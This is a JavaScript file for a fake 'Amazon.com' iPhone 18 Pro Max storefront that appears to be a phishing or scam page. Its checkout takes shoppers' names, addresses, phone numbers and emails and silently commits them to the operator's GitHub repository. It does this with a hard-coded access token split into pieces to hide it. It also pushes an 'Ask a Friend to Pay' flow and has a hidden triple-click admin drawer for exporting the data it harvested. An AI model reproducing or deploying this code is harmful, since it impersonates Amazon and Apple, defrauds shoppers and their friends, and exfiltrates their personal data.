/**
 * Amazon.com - Official Apple iPhone 18 Pro Max Flagship Showcase & Fluid Checkout
 * 100% Real Official Apple Store Images, Real-Time Dates, Friend-Perspective Ordering
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple iPhone 18 Pro Max",
  seller: "Apple Official Store",
  colors: {
    "Cosmic Purple": {
      img: PATH_PREFIX + "images/iphone18/iphone18-cosmic-purple.jpg",
      thumb: PATH_PREFIX + "images/iphone18/iphone18-cosmic-purple.jpg",
      swatchClass: "swatch-cosmic-purple"
    },
    "Desert Titanium": {
      img: PATH_PREFIX + "images/iphone18/iphone18-desert-titanium.jpg",
      thumb: PATH_PREFIX + "images/iphone18/iphone18-desert-titanium.jpg",
      swatchClass: "swatch-desert-titanium"
    },
    "Natural Titanium": {
      img: PATH_PREFIX + "images/iphone18/iphone18-natural-titanium.jpg",
      thumb: PATH_PREFIX + "images/iphone18/iphone18-natural-titanium.jpg",
      swatchClass: "swatch-natural-titanium"
    },
    "Space Black": {
      img: PATH_PREFIX + "images/iphone18/iphone18-space-black.jpg",
      thumb: PATH_PREFIX + "images/iphone18/iphone18-space-black.jpg",
      swatchClass: "swatch-space-black"
    }
  },
  storagePrices: {
    "256 GB": 1799.00,
    "512 GB": 1999.00,
    "1 TB": 2299.00,
    "2 TB": 2599.00
  }
};

// Current Session State
const state = {
  color: "Cosmic Purple",
  storage: "256 GB",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  placedOrder: null
};

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers (Automatically changes with system clock)
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
//  Commits order details directly to 'orders.json' and 'order.json' across stores & root
//  https://github.com/amazon-shopping-official/amazon-shopping-official.github.io
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/iphone18promax",
  filePath: "store/iphone18promax/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      // Check if exact order ID already exists in this file
      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function fetchOrdersFromAPI() {
  const local = JSON.parse(localStorage.getItem('amazon_placed_orders_iphone18') || '[]');
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to localStorage:', err.message);
    return local;
  }
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`
  ];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

document.addEventListener("DOMContentLoaded", () => {
  setupProductOptions();
  setupBuyNow();
  setupCheckoutAccordion();
  setupOrdersDrawer();
  setupAmazonRedirects();
  setupLanguageSwitcher();
  updateOrdersBadge();

  // Handle URL hash navigation
  if (window.location.hash === "#checkout") {
    openCheckout();
  }
  window.addEventListener("popstate", (e) => {
    if (window.location.hash === "#checkout") {
      openCheckout(false);
    } else if (window.location.hash === "#confirmation") {
      // Stay on confirmation if active
    } else {
      closeCheckout(false);
    }
  });
});

// 1. Product Options, Swatches, and Image Sync
function setupProductOptions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const thumbs = document.querySelectorAll(".thumb-item");
  const swatches = document.querySelectorAll(".swatch-btn");
  const storageBtns = document.querySelectorAll(".storage-choice");
  const colorText = document.getElementById("currentColorText");
  const storageText = document.getElementById("currentStorageText");
  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const productTitle = document.getElementById("productTitle");
  const selectQty = document.getElementById("selectQty");

  function updatePriceDisplay() {
    const unitPrice = PRODUCT.storagePrices[state.storage] || 1799.00;
    const formatted = formatMoney(unitPrice);
    if (centerPrice) centerPrice.textContent = unitPrice.toLocaleString("en-US");
    if (buyBoxPrice) buyBoxPrice.textContent = formatted;
    if (productTitle) {
      productTitle.textContent = `${PRODUCT.title} (${state.storage}) - ${state.color} (Unlocked)`;
    }
    if (storageText) storageText.textContent = state.storage;
    if (colorText) colorText.textContent = state.color;
  }

  function setProductColor(colorName) {
    if (!PRODUCT.colors[colorName]) return;
    state.color = colorName;
    const colorObj = PRODUCT.colors[colorName];

    // Change main image with smooth fade
    if (mainPhoto && colorObj.img) {
      mainPhoto.style.opacity = "0.3";
      setTimeout(() => {
        mainPhoto.src = colorObj.img;
        mainPhoto.alt = `${PRODUCT.title} in ${colorName}`;
        mainPhoto.style.opacity = "1";
      }, 120);
    }

    // Sync active swatch button
    swatches.forEach(b => {
      b.classList.toggle("active", b.dataset.color === colorName);
    });

    // Sync active thumbnail
    thumbs.forEach(t => {
      t.classList.toggle("active", t.dataset.color === colorName);
    });

    updatePriceDisplay();
  }

  // Swatch click handlers
  swatches.forEach(btn => {
    btn.addEventListener("click", () => {
      const c = btn.dataset.color;
      setProductColor(c);
    });
  });

  // Thumbnail click / hover handlers
  thumbs.forEach(thumb => {
    const activateThumb = () => {
      thumbs.forEach(t => t.classList.remove("active"));
      thumb.classList.add("active");
      if (thumb.dataset.color) {
        setProductColor(thumb.dataset.color);
      } else if (thumb.dataset.img && mainPhoto) {
        mainPhoto.style.opacity = "0.3";
        setTimeout(() => {
          mainPhoto.src = thumb.dataset.img;
          mainPhoto.style.opacity = "1";
        }, 100);
      }
    };
    thumb.addEventListener("click", activateThumb);
    thumb.addEventListener("mouseenter", activateThumb);
  });

  // Storage selection handlers
  storageBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      storageBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.storage = btn.dataset.storage;
      updatePriceDisplay();
    });
  });

  // Quantity selector
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
    });
  }

  updatePriceDisplay();
}

// 2. Buy Now Trigger
function setupBuyNow() {
  const btnBuyNow = document.getElementById("btnBuyNow");
  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", (e) => {
      e.preventDefault();
      openCheckout(true);
    });
  }

  const btnBack = document.getElementById("btnBackToProduct");
  if (btnBack) {
    btnBack.addEventListener("click", (e) => {
      e.preventDefault();
      closeCheckout(true);
    });
  }
}

function openCheckout(pushHistory = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const confScreen = document.getElementById("orderConfirmationScreen");

  if (viewProduct) viewProduct.style.display = "none";
  if (confScreen) confScreen.classList.remove("active");
  if (viewCheckout) {
    viewCheckout.classList.add("active");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  const checkoutGrid = document.getElementById("checkoutGridArea");
  if (checkoutGrid) checkoutGrid.style.display = "grid";

  syncOrderSummary();

  if (pushHistory) {
    try {
      history.pushState({ view: "checkout" }, "", "#checkout");
    } catch (e) {}
  }
}

function closeCheckout(popHistory = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");

  if (viewCheckout) viewCheckout.classList.remove("active");
  if (viewProduct) {
    viewProduct.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  if (popHistory && window.location.hash === "#checkout") {
    try {
      history.back();
    } catch (e) {}
  }
}

// Sync Sidebar & Accordion Order Summary
function syncOrderSummary() {
  const unit = PRODUCT.storagePrices[state.storage] || 1799.00;
  const total = unit * state.qty;
  const colorObj = PRODUCT.colors[state.color] || {};

  const chItemTitle = document.getElementById("chItemTitle");
  const chItemSpecs = document.getElementById("chItemSpecs");
  const chItemPrice = document.getElementById("chItemPrice");
  const chItemThumb = document.getElementById("chItemThumb");
  const chSummaryItemsTotal = document.getElementById("chSummaryItemsTotal");
  const chSummaryGrandTotal = document.getElementById("chSummaryGrandTotal");
  const chBottomGrandTotal = document.getElementById("chBottomGrandTotal");
  const confFriendItemTitle = document.getElementById("confFriendItemTitle");

  if (chItemTitle) chItemTitle.textContent = `${PRODUCT.title} (${state.storage})`;
  if (chItemSpecs) chItemSpecs.textContent = `Finish: ${state.color} | Qty: ${state.qty} | Unlocked`;
  if (chItemPrice) chItemPrice.textContent = formatMoney(unit);
  if (chItemThumb && colorObj.thumb) chItemThumb.src = colorObj.thumb;

  if (chSummaryItemsTotal) chSummaryItemsTotal.textContent = formatMoney(total);
  if (chSummaryGrandTotal) chSummaryGrandTotal.textContent = formatMoney(total);
  if (chBottomGrandTotal) chBottomGrandTotal.textContent = formatMoney(total);
  if (confFriendItemTitle) confFriendItemTitle.textContent = `${PRODUCT.title} (${state.storage}) - ${state.color}`;
}

// 3. Checkout Accordion (Address, Payment, Review)
function setupCheckoutAccordion() {
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepCardReview = document.getElementById("stepCardReview");

  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");

  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnEditPayment = document.getElementById("btnEditPayment");

  const btnSubmitAddress = document.getElementById("btnSubmitAddress");
  const btnContinuePayment = document.getElementById("btnContinuePayment");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");

  // Step 1: Save Address
  if (btnSubmitAddress) {
    btnSubmitAddress.addEventListener("click", () => {
      const fullName = document.getElementById("inputFullName")?.value.trim();
      const deliveryAddress = document.getElementById("inputDeliveryAddress")?.value.trim();
      const phone = document.getElementById("inputPhone")?.value.trim();
      const email = document.getElementById("inputEmail")?.value.trim();

      if (!fullName || !deliveryAddress) {
        showToast("Please enter your full name and delivery address.");
        return;
      }

      state.address = { fullName, deliveryAddress, phone, email };

      // Update Delivery Header in Amazon Navbar
      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) headerLoc.textContent = fullName;

      // Collapse Step 1 & show summary
      if (stepAddressBody) stepAddressBody.style.display = "none";
      if (stepAddressSummary) {
        stepAddressSummary.style.display = "block";
        stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
      }
      if (btnEditAddress) btnEditAddress.style.display = "block";
      if (stepCardAddress) {
        stepCardAddress.classList.remove("active");
        stepCardAddress.classList.add("completed");
      }

      // Expand Step 2 (Payment)
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepCardPayment) {
        stepCardPayment.classList.add("active");
        stepCardPayment.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    });
  }

  // Edit Address
  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      if (stepAddressBody) stepAddressBody.style.display = "block";
      if (stepAddressSummary) stepAddressSummary.style.display = "none";
      if (btnEditAddress) btnEditAddress.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.add("active");
    });
  }

  // Step 2: Payment Method Choice
  const payRadios = document.querySelectorAll('input[name="paymentOption"]');
  const friendFields = document.getElementById("friendPaymentFields");
  const ccFields = document.getElementById("creditCardFields");

  payRadios.forEach(radio => {
    radio.addEventListener("change", (e) => {
      const val = e.target.value;
      state.paymentMethod = val;
      if (friendFields) friendFields.style.display = (val === "Ask a Friend to Pay") ? "block" : "none";
      if (ccFields) ccFields.style.display = (val === "Credit or Debit Card") ? "block" : "none";
    });
  });

  // Continue to Review
  if (btnContinuePayment) {
    btnContinuePayment.addEventListener("click", () => {
      if (!state.address) {
        showToast("Please confirm your shipping address first.");
        return;
      }

      // Collapse Step 2 & show summary
      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepPaymentSummary) {
        stepPaymentSummary.style.display = "block";
        if (state.paymentMethod === "Ask a Friend to Pay") {
          const friendEmail = document.getElementById("inputFriendEmail")?.value.trim() || "friend@example.com";
          stepPaymentSummary.innerHTML = `<strong>Ask a Friend to Pay:</strong> Amazon will send the secure payment request to <em>${friendEmail}</em>.`;
        } else {
          stepPaymentSummary.innerHTML = `<strong>Payment Method:</strong> ${state.paymentMethod}`;
        }
      }
      if (btnEditPayment) btnEditPayment.style.display = "block";
      if (stepCardPayment) {
        stepCardPayment.classList.remove("active");
        stepCardPayment.classList.add("completed");
      }

      // Expand Step 3 (Review)
      if (stepCardReview) {
        stepCardReview.classList.add("active");
        const reviewBody = document.getElementById("stepReviewBody");
        if (reviewBody) reviewBody.style.display = "block";
        syncOrderSummary();
        stepCardReview.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    });
  }

  // Edit Payment
  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (btnEditPayment) btnEditPayment.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.add("active");
    });
  }

  // Step 3: Place Your Order trigger
  function triggerPlaceOrder(e) {
    if (e && e.preventDefault) e.preventDefault();

    if (!state.address) {
      const inputName = document.getElementById("inputFullName");
      const inputAddr = document.getElementById("inputDeliveryAddress");
      const inputPhone = document.getElementById("inputPhone");
      const inputEmail = document.getElementById("inputEmail");
      
      const fullName = inputName ? inputName.value.trim() : "";
      const deliveryAddress = inputAddr ? inputAddr.value.trim() : "";
      const phone = inputPhone ? inputPhone.value.trim() : "";
      const email = inputEmail ? inputEmail.value.trim() : "";

      if (fullName && deliveryAddress) {
        state.address = { fullName, deliveryAddress, phone, email };
        const headerLoc = document.getElementById("headerLocText");
        if (headerLoc) headerLoc.textContent = fullName;
        if (stepAddressBody) stepAddressBody.style.display = "none";
        if (stepAddressSummary) {
          stepAddressSummary.style.display = "block";
          stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
        }
        if (btnEditAddress) btnEditAddress.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.remove("active");
          stepCardAddress.classList.add("completed");
        }
      } else {
        showToast("Please enter your delivery name and address first.");
        if (stepAddressBody) stepAddressBody.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.add("active");
          stepCardAddress.scrollIntoView({ behavior: "smooth", block: "center" });
        }
        if (inputName && !fullName) inputName.focus();
        else if (inputAddr && !deliveryAddress) inputAddr.focus();
        return;
      }
    }

    // Disable buttons & show loading state
    if (btnFinalPlaceOrder) {
      btnFinalPlaceOrder.disabled = true;
      btnFinalPlaceOrder.dataset.origText = btnFinalPlaceOrder.innerHTML;
      btnFinalPlaceOrder.innerHTML = 'Placing your order...';
    }
    if (btnSummaryPlaceOrder) {
      btnSummaryPlaceOrder.disabled = true;
      btnSummaryPlaceOrder.dataset.origText = btnSummaryPlaceOrder.innerHTML;
      btnSummaryPlaceOrder.innerHTML = 'Placing your order...';
    }

    setTimeout(() => {
      try {
        completeOrderPlacement();
      } finally {
        if (btnFinalPlaceOrder) {
          btnFinalPlaceOrder.disabled = false;
          if (btnFinalPlaceOrder.dataset.origText) btnFinalPlaceOrder.innerHTML = btnFinalPlaceOrder.dataset.origText;
        }
        if (btnSummaryPlaceOrder) {
          btnSummaryPlaceOrder.disabled = false;
          if (btnSummaryPlaceOrder.dataset.origText) btnSummaryPlaceOrder.innerHTML = btnSummaryPlaceOrder.dataset.origText;
        }
      }
    }, 400);
  }

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", triggerPlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", triggerPlaceOrder);
}

// 4. Complete Order Placement & Clean Authentic Amazon Confirmation Screen
async function completeOrderPlacement() {
  const unit = PRODUCT.storagePrices[state.storage] || 1799.00;
  const totalAmount = unit * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  const placedOrder = {
    orderId: orderNumber,
    timestamp: new Date().toISOString(),
    name: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    item: `${PRODUCT.title} (${state.storage}) - ${state.color}`,
    price: formatMoney(totalAmount),
    qty: state.qty,
    payMethod: state.paymentMethod,
    dateStr: orderDateFormatted
  };

  // 1. Save to Local Storage
  try {
    const existingOrders = JSON.parse(localStorage.getItem("amazon_placed_orders_iphone18") || "[]");
    existingOrders.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_iphone18", JSON.stringify(existingOrders));
  } catch (e) {
    console.warn("LocalStorage save error:", e);
  }

  // 2. Commit Order Details to GitHub Repo orders.json & order.json
  saveOrderToAPI(placedOrder);

  // 3. Populate Order Confirmation Screen safely
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confOrderNumber", orderNumber);
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", placedOrder.item);
  safeSet("confQty", state.qty);
  safeSet("confTotal", formatMoney(totalAmount));
  safeSet("confPayMethod", state.paymentMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");
  if (state.paymentMethod === "Ask a Friend to Pay") {
    if (friendBox) friendBox.style.display = "flex";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  } else {
    if (friendBox) friendBox.style.display = "none";
    if (payStatus) payStatus.textContent = `Status: ${state.paymentMethod} recorded`;
  }

  // Switch views smoothly
  const checkoutGrid = document.getElementById("checkoutGridArea");
  if (checkoutGrid) checkoutGrid.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  try {
    history.pushState({ view: "confirmation" }, "", "#confirmation");
  } catch (e) {}

  updateOrdersBadge();
  if (typeof renderOrdersDrawer === "function") {
    renderOrdersDrawer();
  }

  showToast("Order placed successfully! Check your email for confirmation.");
}

// 5. Slide-Out Customer Orders Drawer
function setupOrdersDrawer() {
  const drawer = document.getElementById("ordersDrawer");
  const backdrop = document.getElementById("drawerBackdrop");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const clearBtn = document.getElementById("btnClearAllOrders");
  const exportBtn = document.getElementById("btnExportOrdersCsv");
  const footerTrigger = document.getElementById("footerAdminTrigger");
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoice = document.getElementById("btnCloseInvoiceModal");

  function openDrawer() {
    if (drawer) drawer.classList.add("open");
    if (backdrop) backdrop.classList.add("open");
    renderOrdersDrawer();
  }

  function closeDrawer() {
    if (drawer) drawer.classList.remove("open");
    if (backdrop) backdrop.classList.remove("open");
  }

  const navOrdersBtn = document.getElementById("navOrdersBtn");
  if (navOrdersBtn) {
    navOrdersBtn.addEventListener("click", (e) => {
      e.preventDefault();
      openDrawer();
    });
  }

  const confTrackBtn = document.getElementById("confTrackPackageBtn");
  if (confTrackBtn) {
    confTrackBtn.addEventListener("click", (e) => {
      e.preventDefault();
      openDrawer();
    });
  }

  if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeDrawer);
  if (backdrop) backdrop.addEventListener("click", closeDrawer);

  let clickCount = 0;
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      clickCount++;
      if (clickCount >= 3) {
        clickCount = 0;
        openDrawer();
      }
    });
  }

  if (clearBtn) {
    clearBtn.addEventListener("click", async () => {
      if (confirm("Reset all orders? This will clear local storage and sync an empty array to GitHub repository.")) {
        localStorage.removeItem("amazon_placed_orders_iphone18");
        clearBtn.disabled = true;
        clearBtn.textContent = "Clearing...";
        await deleteOrdersFromAPI();
        clearBtn.disabled = false;
        clearBtn.textContent = "Clear All Orders";
        renderOrdersDrawer();
        updateOrdersBadge();
        showToast("All orders have been reset.");
      }
    });
  }

  if (exportBtn) {
    exportBtn.addEventListener("click", async () => {
      const orders = await fetchOrdersFromAPI();
      if (!orders || orders.length === 0) {
        showToast("No orders available to export.");
        return;
      }
      exportOrdersToCSV(orders);
    });
  }

  if (btnCloseInvoice && invoiceModal) {
    btnCloseInvoice.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) invoiceModal.style.display = "none";
    });
  }
}

async function renderOrdersDrawer() {
  const container = document.getElementById("drawerOrdersList");
  if (!container) return;

  container.innerHTML = '<div style="padding:24px; text-align:center; color:#565959;"><div class="spinner" style="margin:0 auto 10px;"></div>Loading orders...</div>';

  const orders = await fetchOrdersFromAPI();

  if (!orders || orders.length === 0) {
    container.innerHTML = `
      <div style="padding:48px 24px; text-align:center; color:#565959;">
        <div style="font-size:36px; margin-bottom:12px;">📦</div>
        <div style="font-weight:700; color:#0f1111; margin-bottom:6px;">No orders found</div>
        <div style="font-size:13px;">Placed orders will be listed here automatically.</div>
      </div>
    `;
    return;
  }

  container.innerHTML = orders.map((ord, idx) => `
    <div class="drawer-order-card" style="border:1px solid #d5d9d9; border-radius:8px; margin:12px 16px; padding:16px; background:#fff; box-shadow:0 1px 3px rgba(0,0,0,0.05);">
      <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; border-bottom:1px solid #eee; padding-bottom:8px;">
        <div>
          <span style="display:inline-block; background:#e7f4f5; color:#007185; font-size:11px; font-weight:700; padding:2px 6px; border-radius:3px;">
            ${ord.payMethod || 'Ask a Friend to Pay'}
          </span>
          <div style="font-size:11px; color:#565959; margin-top:4px;">${ord.dateStr || ''}</div>
        </div>
        <div style="font-size:16px; font-weight:700; color:#b12704;">
          ${ord.price || '$1,799.00'}
        </div>
      </div>
      <div style="font-weight:700; font-size:14px; color:#0f1111; margin-bottom:4px;">
        ${ord.item || 'Apple iPhone 18 Pro Max'}
      </div>
      <div style="font-size:12px; color:#565959; line-height:1.4; margin-bottom:12px;">
        <strong>Ship to:</strong> ${ord.name || 'Recipient'}<br>
        ${ord.address || ''}<br>
        ${ord.phoneNumber ? 'Tel: ' + ord.phoneNumber : ''}
      </div>
      <div style="display:flex; gap:8px;">
        <button type="button" class="btn-invoice-view" data-index="${idx}" style="flex:1; padding:6px; font-size:12px; background:#fff; border:1px solid #d5d9d9; border-radius:4px; font-weight:600; cursor:pointer;">
          📄 View Invoice
        </button>
      </div>
    </div>
  `).join('');

  container.querySelectorAll(".btn-invoice-view").forEach(btn => {
    btn.addEventListener("click", () => {
      const ord = orders[parseInt(btn.dataset.index, 10)];
      if (ord) openInvoiceModal(ord);
    });
  });
}

function updateOrdersBadge() {
  const badge = document.getElementById("navOrdersBadge");
  if (!badge) return;
  try {
    const orders = JSON.parse(localStorage.getItem("amazon_placed_orders_iphone18") || "[]");
    if (orders.length > 0) {
      badge.textContent = orders.length;
      badge.style.display = "inline-flex";
    } else {
      badge.style.display = "none";
    }
  } catch (e) {}
}

function openInvoiceModal(ord) {
  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");
  if (!modal || !content) return;

  content.innerHTML = `
    <div style="border-bottom:2px solid #0f1111; padding-bottom:12px; margin-bottom:16px; display:flex; justify-content:space-between; align-items:center;">
      <div>
        <h2 style="font-size:20px; font-weight:700; margin:0; color:#0f1111;">Amazon.com</h2>
        <div style="font-size:12px; color:#565959;">Final Details for Order</div>
      </div>
      <div style="text-align:right; font-size:12px; color:#565959;">
        <div>Print Date: ${new Date().toLocaleDateString("en-US")}</div>
      </div>
    </div>

    <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:20px; background:#fafafa; padding:12px; border-radius:6px;">
      <div>
        <div style="font-weight:700; color:#0f1111; margin-bottom:4px;">Shipping Address</div>
        <div style="color:#333;">
          ${ord.name || 'Customer'}<br>
          ${ord.address || 'Address on file'}<br>
          ${ord.phoneNumber ? 'Phone: ' + ord.phoneNumber : ''}<br>
          ${ord.email ? 'Email: ' + ord.email : ''}
        </div>
      </div>
      <div>
        <div style="font-weight:700; color:#0f1111; margin-bottom:4px;">Payment Method</div>
        <div style="color:#333;">
          ${ord.payMethod || 'Ask a Friend to Pay'}<br>
          <span style="font-size:11px; color:#007600; font-weight:600;">Status: Verified &amp; Pending Fulfillment</span>
        </div>
      </div>
    </div>

    <table style="width:100%; border-collapse:collapse; margin-bottom:20px; font-size:13px;">
      <thead>
        <tr style="border-bottom:1px solid #ccc; text-align:left; color:#565959;">
          <th style="padding:6px 0;">Items Ordered</th>
          <th style="padding:6px 0; text-align:center;">Qty</th>
          <th style="padding:6px 0; text-align:right;">Price</th>
        </tr>
      </thead>
      <tbody>
        <tr style="border-bottom:1px solid #eee;">
          <td style="padding:10px 0; font-weight:600; color:#0f1111;">
            ${ord.item || 'Apple iPhone 18 Pro Max'}
            <div style="font-size:11px; font-weight:normal; color:#565959;">Sold by: Apple Official Store</div>
          </td>
